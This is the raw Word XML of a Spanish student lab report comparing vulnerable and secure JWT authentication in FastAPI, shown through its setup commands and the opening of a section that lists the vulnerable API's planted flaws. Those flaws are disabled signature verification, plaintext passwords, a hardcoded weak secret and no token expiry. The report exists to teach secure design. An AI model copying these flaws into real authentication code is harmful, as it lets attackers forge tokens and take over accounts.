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E7DD0" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="479D7140" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E0E722C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="52"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>LABORATORIO DE SEGURIDAD EN APIs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3EFE98" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="32"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Autenticación Vulnerable vs Autenticación Segura con FastAPI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB9C365" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1389B9AF" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>───────────────────────────────────────────────────────</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A526B3" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BCA5660" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Curso: Seguridad en Desarrollo de Software</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C60874E" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Institución: Universidad Cooperativa de Colombia</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E337A6E" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Fecha: 14 de May de 2026</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EC7F30" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Tecnologías: Python 3.13 · FastAPI · JWT · RSA-2048</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A75D731" w14:textId="7C186EF1" w:rsidR="00233214" w:rsidRPr="00AB6745" w:rsidRDefault="00233214">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Estudiante: sergio andres gutierrez camargo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC89C64" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="112477C1" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F12EF45" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="36"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>0. Preparación del Entorno</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547200D5" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Se verifica la versión de Python instalada (≥3.10) y se crea la carpeta del laboratorio. Todas las dependencias se instalan con pip antes de iniciar cualquier servidor.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3496D242" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Verificación de Python y creación del directorio</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190CF084" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&gt; CMD – Verificación del entorno</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="1EE03D78" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="2073B6D2" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="123958FA" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>C:\Users\sergu\Desktop\tarea&gt; python --version</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D173B9F" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Python 3.13.11</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F572392" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CFC6598" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>C:\Users\sergu\Desktop\tarea&gt; mkdir lab_auth_security</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49D22B9F" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>C:\Users\sergu\Desktop\tarea&gt; cd lab_auth_security</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1BA2DBBE" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51D4D5E0" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Instalación de dependencias</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1DC1A6" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  &gt; CMD – pip install</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="6A1FC9AC" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="299ADDE4" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="353F2C8D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>pip install fastapi uvicorn pyjwt requests python-jose[cryptography] bcrypt python-docx cryptography</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="539CE3F4" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44E1F376" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Successfully installed:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B45DE52" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  fastapi-0.136.1   uvicorn-0.46.0    pyjwt-2.12.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="326EAB35" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  requests-2.32.5   python-jose-3.5.0 bcrypt-5.0.0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AAAEBAA" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  cryptography-46.0.5   python-docx-1.2.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6088C16B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79712253" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="043EBF0B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00233214" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="36"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>1. API Vulnerable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7633CA41" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00233214" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>La API vulnerable comete varios errores críticos de seguridad que se analizarán en detalle. El más grave: deshabilita completamente la verificación de firma JWT con verify_signature=False, permitiendo que cualquier atacante forje tokens.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601BA87D" w14:textId="77777777" w:rsidR="00233214" w:rsidRPr="00233214" w:rsidRDefault="00233214" w:rsidP="00233214">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="352D7C29" w14:textId="201B9EE6" w:rsidR="00FF500C" w:rsidRPr="00233214" w:rsidRDefault="00233214" w:rsidP="00233214">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>VULNERABILIDADES IDENTIFICADAS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [1] verify_signature=False → cualquier token es aceptado sin validar firma</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [2] Contraseñas en texto plano en diccionario Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [3] Secreto JWT débil ('supersecret') codificado en el fuente</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [4] Sin validación de expiración del token (no hay campo 'exp')</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  [5] Algoritmo simétrico HS256 → si el secreto se filtra, todo cae</w:t>
      </w:r>
    </w:p>
